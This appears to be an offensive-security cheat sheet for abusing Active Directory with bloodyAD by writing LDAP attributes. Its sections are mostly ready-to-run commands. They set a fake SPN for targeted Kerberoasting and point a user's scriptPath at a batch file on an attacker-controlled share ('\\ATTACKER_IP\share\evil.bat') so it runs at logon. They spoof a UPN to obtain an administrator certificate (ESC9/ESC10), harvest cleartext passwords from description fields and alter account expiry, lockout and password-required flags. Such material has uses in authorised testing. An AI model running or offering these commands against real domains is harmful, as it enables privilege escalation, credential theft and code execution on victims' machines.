# 08.01 bloodyAD Attribute Manipulation Targeted Kerberoasting

> Write any LDAP attribute via `bloodyAD set object -v` — targeted Kerberoast (SPN), ESC9/10 (UPN), logon-script (scriptPath), description hunts.

## Overview

bloodyAD's set object -v flag directly writes any writable LDAP attribute. Key attacks: set SPN for targeted Kerberoasting, set scriptPath for logon script abuse, set UPN for ESC9/ESC10 cert mapping attacks, set description to harvest plaintext passwords.

## Steps

- set object requires GenericWrite (or specific write right) on the target attribute
- Setting a fake SPN on a regular account enables targeted Kerberoasting — then request TGS and crack
- scriptPath logon script: file must be on a share the DC resolves; delivers code on next logon
- UPN spoofing (for ESC9/ESC10): set userPrincipalName to administrator@domain.local before requesting cert
- After ESC9 cert: reset UPN back, then use cert for PKINIT as administrator
- Reading description field often reveals plaintext passwords left by admins

## Commands

### Set SPN for targeted Kerberoasting (GenericWrite)

```bash
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP set object targetuser -v servicePrincipalName 'MSSQLSvc/fake.domain.local:1433'
# Request ticket:
impacket-GetUserSPNs DOMAIN/attacker:pass -dc-ip DC_IP -request-user targetuser -format hashcat
# Cleanup — remove SPN:
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP set object targetuser -v servicePrincipalName ''
```

### Set logon script path (scriptPath abuse)

```bash
# Place evil.bat on accessible share first
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP set object targetuser -v scriptPath '\\ATTACKER_IP\share\evil.bat'
# Verify:
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP get object targetuser --attr scriptPath
```

### UPN spoofing for ESC9/ESC10 (GenericWrite)

```bash
# 1. Set victim UPN to admin UPN
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP set object victimuser -v userPrincipalName 'administrator@domain.local'
# 2. Request certificate as victimuser (via Certipy)
certipy req -u victimuser@domain.local -p pass -target CA.DOMAIN.LOCAL -template VulnerableTemplate -ca CA_NAME
# 3. Reset UPN back
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP set object victimuser -v userPrincipalName 'victimuser@domain.local'
# 4. Auth as administrator with cert
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### Read description fields (cleartext passwords)

```bash
bloodyAD -u user -p pass -d DOMAIN --host DC_IP get search --filter '(description=*)' --attr sAMAccountName,description
# Targeted:
bloodyAD -u user -p pass -d DOMAIN --host DC_IP get object targetuser --attr description
```

### Set account to never expire / unlock

```bash
# Never expire:
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP set object victimuser -v accountExpires 0
# Unlock (lockoutTime = 0):
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP set object victimuser -v lockoutTime 0
# Set password not required:
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP set object victimuser -v userAccountControl 544
```
